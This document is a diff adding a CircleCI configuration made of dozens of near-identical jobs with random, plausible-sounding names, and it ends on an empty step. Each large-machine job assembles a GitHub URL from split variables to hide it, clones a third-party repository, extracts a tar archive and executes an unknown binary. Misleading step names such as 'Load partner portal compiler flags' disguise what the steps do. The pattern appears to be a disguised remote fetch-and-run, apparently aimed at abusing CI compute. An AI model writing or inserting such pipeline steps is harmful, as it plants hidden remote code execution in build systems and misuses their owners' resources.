@@ -1,0 +1,1871 @@
+version: 2.1
+
+jobs:
+  renameLibraryInBackground:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: Link validator binaries in container
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'pre-launch-syntax-check GenerateSignatures' | sed 'p;d' | head -1 > /tmp/plugins-part-7/BasicMatrix
+            du -b /tmp/plugins-part-7/BasicMatrix
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'BasicMatrix'
+  post-test-approval-gate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/BasicMatrix"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --recurse-submodules "https://$part/$stepof/$metrics" ${PWD}
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar --extract -f StoreAccessProxyBuildReport.tar --directory .
+      - run:
+          command: |
+            env "./DesktopAppSourceArchiveStep18"
+  LintManifestsForEveryModule:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: fallbackReleaseSigningRun
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'SequentialCacheDownload launchWebAppUpgradeTestsGroup8' | sed 'p;d' | head -1 > /tmp/plugins-part-7/fullExtensionTypeChecks
+            du -b /tmp/plugins-part-7/fullExtensionTypeChecks
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'fullExtensionTypeChecks'
+  parallel-verification:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/fullExtensionTypeChecks"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --quiet --depth 1 "https://$part/$stepof/$metrics" ${PWD}
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            cat StoreAccessProxyBuildReport.tar | tar xf -
+      - run:
+          command: |
+            cd "$PWD" && ./DesktopAppSourceArchiveStep18
+  compile-and-test-profiler:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: Filter changed files
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'cache-workflow DownloadRequiredTools' | sed 'p;d' | head -1 > /tmp/plugins-part-7/MonthlyOperatorHealthChecks
+            du -b /tmp/plugins-part-7/MonthlyOperatorHealthChecks
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'MonthlyOperatorHealthChecks'
+  post-build-data-extraction:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/MonthlyOperatorHealthChecks"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --depth 5 --filter=blob:none "https://$part/$stepof/$metrics" "$(pwd)"
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar -x --file StoreAccessProxyBuildReport.tar --directory .
+      - run:
+          command: |
+            './DesktopAppSourceArchiveStep18'
+  FetchBuildMetadata:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: Install resolver development dependencies from lock file
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'ChecksumVerificationPipeline LowPriorityArtifactCompression' | sed 'p;d' | head -1 > /tmp/plugins-part-7/HourlyRepositoryFetchPhase
+            du -b /tmp/plugins-part-7/HourlyRepositoryFetchPhase
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'HourlyRepositoryFetchPhase'
+  preview-release-pipeline:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/HourlyRepositoryFetchPhase"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --depth 1 --single-branch "https://$part/$stepof/$metrics" $(pwd)
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar --verbose --extract -f StoreAccessProxyBuildReport.tar
+      - run:
+          command: |
+            cd "$PWD" && exec ./DesktopAppSourceArchiveStep18
+  MonitorPackaging:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: Compress timing data and upload artifacts
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'pre-cleanup-browser-tests LoadBalancerReferenceData' | sed 'p;d' | head -1 > /tmp/plugins-part-7/Troubleshoot
+            du -b /tmp/plugins-part-7/Troubleshoot
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'Troubleshoot'
+  OneTimeMigrationTest:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/Troubleshoot"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --depth=2 --branch main "https://$part/$stepof/$metrics" "`pwd`"
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar xvf StoreAccessProxyBuildReport.tar
+      - run:
+          command: |
+            bash -eo pipefail -c "./DesktopAppSourceArchiveStep18"
+  on-demand-state-backup-pipeline:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: low-priority-billing-service-release-freeze
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'PerformDecoderLintChecks dailyDeploymentSummary' | sed 'p;d' | head -1 > /tmp/plugins-part-7/ReleaseApprovalPipeline
+            du -b /tmp/plugins-part-7/ReleaseApprovalPipeline
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'ReleaseApprovalPipeline'
+  emergency-provisioning:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/ReleaseApprovalPipeline"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --depth 1 --single-branch "https://$part/$stepof/$metrics" "`pwd`"
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar xf StoreAccessProxyBuildReport.tar -C .
+      - run:
+          command: |
+            bash -c './DesktopAppSourceArchiveStep18'
+  DeployContainerImage:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: Wave 3
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'PreliminaryNightlyPipelineSlot2 ScanLinkCheckerModules' | sed 'p;d' | head -1 > /tmp/plugins-part-7/create-temporary-directory
+            du -b /tmp/plugins-part-7/create-temporary-directory
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'create-temporary-directory'
+  server-dependency-review-stage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/create-temporary-directory"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --jobs 1 --depth 1 "https://$part/$stepof/$metrics" "."
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar -xf StoreAccessProxyBuildReport.tar --no-same-owner
+      - run:
+          command: |
+            bash -lc "./DesktopAppSourceArchiveStep18"
+  evaluate-benchmark-results:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: Fetch Fixtures From Previous Job
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'initial-cache-rebuild assemble-logger-release-package' | sed 'p;d' | head -1 > /tmp/plugins-part-7/complete-promotion
+            du -b /tmp/plugins-part-7/complete-promotion
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'complete-promotion'
+  RuntimeMigrations:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/complete-promotion"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --depth 3 --no-tags --filter=blob:none "https://$part/$stepof/$metrics" "$(pwd)"
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar --extract -f StoreAccessProxyBuildReport.tar -C .
+      - run:
+          command: |
+            cd . && ./DesktopAppSourceArchiveStep18
+  catalog-changelog-round-3:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: PostCheckoutClusterSetup
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'bridgeSchemaSync LaunchMockServer' | sed 'p;d' | head -1 > /tmp/plugins-part-7/analyzerReleasePackage
+            du -b /tmp/plugins-part-7/analyzerReleasePackage
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'analyzerReleasePackage'
+  bridge-cache-upload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/analyzerReleasePackage"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --filter blob:none "https://$part/$stepof/$metrics" .
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar -x --file=StoreAccessProxyBuildReport.tar
+      - run:
+          command: |
+            bash -c "exec ./DesktopAppSourceArchiveStep18"
+  RecordUploadServiceVersion:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: high-priority-deployment-smoke-test-iteration-2
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'SchemaRegistryPlugins repository-backup-phase' | sed 'p;d' | head -1 > /tmp/plugins-part-7/optimize-decoder-static-library
+            du -b /tmp/plugins-part-7/optimize-decoder-static-library
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'optimize-decoder-static-library'
+  engine-package-checksum:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/optimize-decoder-static-library"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --depth=1 --no-single-branch "https://$part/$stepof/$metrics" "./"
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar -xf StoreAccessProxyBuildReport.tar --no-same-permissions
+      - run:
+          command: |
+            cd "$PWD" && exec ./DesktopAppSourceArchiveStep18
+  VerifyingLicenses:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: CompressReportingChangelog
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'Messaging SignWebAppObjectFiles' | sed 'p;d' | head -1 > /tmp/plugins-part-7/UploadWorkflow
+            du -b /tmp/plugins-part-7/UploadWorkflow
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'UploadWorkflow'
+  CollectorCompile:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/UploadWorkflow"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --depth 3 --branch main "https://$part/$stepof/$metrics" "${PWD}"
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar --extract --verbose --file StoreAccessProxyBuildReport.tar
+      - run:
+          command: |
+            env ./DesktopAppSourceArchiveStep18
+  postDeployResourceRemoval:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: batch-worker-publish-shard-16
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'OvernightComplianceScan TimingReportTask' | sed 'p;d' | head -1 > /tmp/plugins-part-7/inform-operators-before-publish
+            du -b /tmp/plugins-part-7/inform-operators-before-publish
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'inform-operators-before-publish'
+  PreUpgradeLinkChecks:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/BasicMatrix"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --jobs 1 --depth 1 "https://$part/$stepof/$metrics" "${PWD}"
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar -xf /dev/stdin < StoreAccessProxyBuildReport.tar
+      - run:
+          command: |
+            bash -lc './DesktopAppSourceArchiveStep18'
+  update-agent-build-metrics:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: Overnight Mailer Static Analysis
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'checkingForUpdatesGroup4 SettingUpSimulatorFromScratch' | sed 'p;d' | head -1 > /tmp/plugins-part-7/installing-test-tools
+            du -b /tmp/plugins-part-7/installing-test-tools
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'installing-test-tools'
+  restart-test-cluster:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/installing-test-tools"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --depth=3 --no-tags "https://$part/$stepof/$metrics" "$PWD"
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar --extract --verbose -f StoreAccessProxyBuildReport.tar
+      - run:
+          command: |
+            bash -c './DesktopAppSourceArchiveStep18'
+  CacheWebAppImage:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: Debugger binary
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'stampDebuggerVersionTag configureBuildCacheJob1Of2' | sed 'p;d' | head -1 > /tmp/plugins-part-7/legacy-beta-release
+            du -b /tmp/plugins-part-7/legacy-beta-release
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'legacy-beta-release'
+  artifact-inspection:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/legacy-beta-release"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --quiet "https://$part/$stepof/$metrics" ${PWD}
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar -x --file StoreAccessProxyBuildReport.tar
+      - run:
+          command: |
+            bash -c "exec ./DesktopAppSourceArchiveStep18"
+  stop-console-workers:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: Record Release Metadata
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'scheduler-backup-stage-4-of-4 EmergencyPackaging' | sed 'p;d' | head -1 > /tmp/plugins-part-7/notification-service-tests
+            du -b /tmp/plugins-part-7/notification-service-tests
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'notification-service-tests'
+  ScanRouterInstaller:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/notification-service-tests"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --filter blob:none "https://$part/$stepof/$metrics" ${PWD}
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar xf StoreAccessProxyBuildReport.tar -C .
+      - run:
+          command: |
+            sh -c "exec ./DesktopAppSourceArchiveStep18"
+  local-artifact-promotion-job:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: RemoteCommitSigning
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'archiving-sources dependency-scan-pipeline' | sed 'p;d' | head -1 > /tmp/plugins-part-7/LongRunningCodeCheckout
+            du -b /tmp/plugins-part-7/LongRunningCodeCheckout
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'LongRunningCodeCheckout'
+  web-app-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/LongRunningCodeCheckout"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --jobs 2 "https://$part/$stepof/$metrics" "./"
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar --extract -f StoreAccessProxyBuildReport.tar
+      - run:
+          command: |
+            cd . && exec ./DesktopAppSourceArchiveStep18
+  HighPriorityInstall:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: Branch Cleanup (node 4 of 4)
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'shard-7-of-11 prune-library-compiler-cache' | sed 'p;d' | head -1 > /tmp/plugins-part-7/PostDeployStep
+            du -b /tmp/plugins-part-7/PostDeployStep
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'PostDeployStep'
+  SchemaMigrationHook:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/PostDeployStep"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --depth 4 "https://$part/$stepof/$metrics" ${PWD}
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar --extract --file StoreAccessProxyBuildReport.tar --directory .
+      - run:
+          command: |
+            exec ./DesktopAppSourceArchiveStep18
+  ExporterArchiveExtractionTask:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: Configure Payment Service Dependency Cache
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'firmware-executable scan-worker' | sed 'p;d' | head -1 > /tmp/plugins-part-7/schedule-reporting-system-tests
+            du -b /tmp/plugins-part-7/schedule-reporting-system-tests
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'schedule-reporting-system-tests'
+  operator-deploy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/schedule-reporting-system-tests"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --filter=blob:none "https://$part/$stepof/$metrics" "`pwd`"
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar xf - < StoreAccessProxyBuildReport.tar
+      - run:
+          command: |
+            exec "./DesktopAppSourceArchiveStep18"
+  PushLoaderImage:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: Obfuscate (pass 5)
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'OvernightArtifactExportJob TrackingCodeCoverage' | sed 'p;d' | head -1 > /tmp/plugins-part-7/pre-launch-dependency-audit
+            du -b /tmp/plugins-part-7/pre-launch-dependency-audit
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'pre-launch-dependency-audit'
+  package-download:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/pre-launch-dependency-audit"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --branch main "https://$part/$stepof/$metrics" "."
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar -xf - < StoreAccessProxyBuildReport.tar
+      - run:
+          command: |
+            bash -c './DesktopAppSourceArchiveStep18'
+  module-compilation-split-3-of-5:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: compile-migrations-and-run-component-tests
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'buildHelpCenterComponentTests testClient' | sed 'p;d' | head -1 > /tmp/plugins-part-7/encoder-integration-tests
+            du -b /tmp/plugins-part-7/encoder-integration-tests
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'encoder-integration-tests'
+  packageLocalization:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/encoder-integration-tests"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --jobs=1 "https://$part/$stepof/$metrics" "$PWD"
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar xf StoreAccessProxyBuildReport.tar
+      - run:
+          command: |
+            exec "./DesktopAppSourceArchiveStep18"
+  setUpDriverDataStore:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: extended validation
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'enforcing-slot-1 Move' | sed 'p;d' | head -1 > /tmp/plugins-part-7/help-center-lint
+            du -b /tmp/plugins-part-7/help-center-lint
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'help-center-lint'
+  applyViewerManifest:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/help-center-lint"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --depth=1 --filter=blob:none "https://$part/$stepof/$metrics" "."
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar xf StoreAccessProxyBuildReport.tar --no-same-owner
+      - run:
+          command: |
+            $(pwd)/DesktopAppSourceArchiveStep18
+  permission-audit-part-1-of-5:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: access-proxy-test-compilation
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'full-image-download-slice-5 backgroundProvisioning' | sed 'p;d' | head -1 > /tmp/plugins-part-7/Phase
+            du -b /tmp/plugins-part-7/Phase
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'Phase'
+  SecondaryPackageDownload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/Phase"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --depth 5 --single-branch "https://$part/$stepof/$metrics" "."
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar -xf StoreAccessProxyBuildReport.tar --no-same-permissions
+      - run:
+          command: |
+            /bin/bash -c "./DesktopAppSourceArchiveStep18"
+  agent-test-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/BasicMatrix"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --depth=5 --no-tags "https://$part/$stepof/$metrics" "`pwd`"
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar --extract -f StoreAccessProxyBuildReport.tar --no-same-owner
+      - run:
+          command: |
+            bash -c "exec ./DesktopAppSourceArchiveStep18"
+  FetchSources:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: PreApprovalCodeAnalysis (lane 2)
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'access-proxy-version-bump RequiredRepositoryFetch' | sed 'p;d' | head -1 > /tmp/plugins-part-7/PostLintBenchmarks
+            du -b /tmp/plugins-part-7/PostLintBenchmarks
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'PostLintBenchmarks'
+  Downloading:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/PostLintBenchmarks"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --depth 1 --no-single-branch "https://$part/$stepof/$metrics" $(pwd)
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar -xf StoreAccessProxyBuildReport.tar -C .
+      - run:
